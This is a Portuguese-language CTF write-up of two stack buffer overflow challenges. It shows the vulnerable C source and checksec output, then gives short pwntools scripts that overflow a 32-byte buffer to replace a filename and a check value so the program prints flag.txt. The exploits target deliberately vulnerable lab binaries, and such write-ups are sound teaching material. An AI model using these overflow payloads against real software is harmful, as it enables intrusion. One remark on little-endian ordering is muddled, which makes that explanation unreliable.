# CTF5

Para podermos realizar este `ctf` devemos primeiro encontrar algumas informações que nos possam ser úteis, neste caso através do `checksec program` e descobrimos o seguinte:

`Arch: i386-32-little` → arquitetura de 32-bits little-endian 

 `RELRO: No RELRO` → o RELRO (RELocations Read-Only ) encontra-se desativado, ou seja não previne certas partes da memória do executável de serem escritas, como o GOT (Global Offset Table)

`Stack: No canary found` → mecanismo de defesa contra buffer overflows encontra-se destivado

`NX: NX disabled` → NX (No-eXecute), que é um mecanismo de defesa que evita a execução de código em certas partes da memória, como a stack, está desativado

`PIE: No PIE (0x8048000)` → PIE (Position Independent Executable) ,que permite que um ficheiro executável seja carregado em qualquer endereço de memória sem precisar de ser alterado, está também desativado.

`RWX: Has RWX segments` → RWX (Read, Write, Execute) o que significa que alguns segmentos presentes têm todas as permissões.

### Análise

```jsx
#include <stdio.h>
#include <stdlib.h>

int main() {
    char meme_file[8] = "mem.txt\0";
    char buffer[32];

    printf("Try to unlock the flag.\n");
    printf("Show me what you got:");
    fflush(stdout);
    scanf("%40s", &buffer);

    printf("Echo %s\n", buffer);

    printf("I like what you got!\n");
    
    FILE *fd = fopen(meme_file,"r");
    
    while(1){
        if(fd != NULL && fgets(buffer, 32, fd) != NULL) {
            printf("%s", buffer);
        } else {
            break;
        }
    }

    fflush(stdout);
    
    return 0;
}
```

Analisando o código verificamos que o scan lê até 40 bytes, no entanto o buffer só tem o tamanho de 32, logo podemos, através de input, dar overflow ao buffer.

Verificamos também que o ficheiro guardado em meme_file é lido para o ficheiro fd, o qual é printed abaixo, logo, se conseguirmos substituir o file guardado em meme_file pelo  pelo file que contêm a flag, neste caso a flag.txt, concluimos o ctf.

Sabendo que a arquitetura é little endian sabemos que as entradas na memória vão do maior para o menor, e como o buffer cresce no sentido contrário da stack então podemos adicionar o texto do modo normal que ficará corretamente guardado no buffer (nem sei se isto é uma cena pareceu correto), 

Para tal devemos dar primeiro overflow ao buffer com o `32 * ‘A’` (escrevemos 32 caracteres) e substituímos `mem.txt\0` pelo ficheiro da flag, deste modo ele vai dar print à flag.txt em vez de dar print ao mem.txt dando-nos assim acesso à flag

```python
from pwn import *
io = remote('ctf-fsi.fe.up.pt', 4003)
io.sendline(b'A' * 32 + b'flag.txt\0')
io.interactive()
```

Após correr o ctf obtemos:

![ctf5_1](images\ctf5_1.png)

## CTF_2

No `ctf` 2 a mesma lógica se aplica para resolver o ctf, sendo este bastante semelhante ao primeiro,

### Análise:

```python
#include <stdio.h>
#include <stdlib.h>

int main() {
    char val[4] = "\xef\xbe\xad\xde";
    char meme_file[9] = "mem.txt\0\0";
    char buffer[32];

    printf("Try to unlock the flag.\n");
    printf("Show me what you got:");
    fflush(stdout);
    scanf("%45s", &buffer);
    if(*(int*)val == 0xfefc2324) {
        printf("I like what you got!\n");
        
        FILE *fd = fopen(meme_file,"r");
        
        while(1){
            if(fd != NULL && fgets(buffer, 32, fd) != NULL) {
                printf("%s", buffer);
            } else {
                break;
            }
        }
    } else {
        printf("You gave me this %s and the value was %p. Disqualified!\n", meme_file, *(long*)val);
    }

    fflush(stdout);
    
    return 0;
}
```

Neste ctf usamos a mesma lógica do ctf anterior a dar overflow ao buffer e tentar dar overwrite ao meme_file para lermos a flag, no entanto neste ctf temos um obstáculo adicional, temos de dar overwrite a val com o valor 0xfefc2324,caso contrário nada será lido para o ficheiro fd, neste caso como escrevemos em hexadecimal e é little endian (guarda em ordem contrária), devemos escrever na ordem contrário, estando assim val overwritten, podemos dar overwrite a meme_file e acedemos novamente à flag. 

```python
from pwn import *
io = remote('ctf-fsi.fe.up.pt', 4000)
io.sendline(b'A'*32 + b"\x24\x23\xfc\xfe"+ b"flag.txt\0")
io.interactive()
```

Com isto, obtivemos este resultado:

![ctf5_2](images\ctf5_2.png)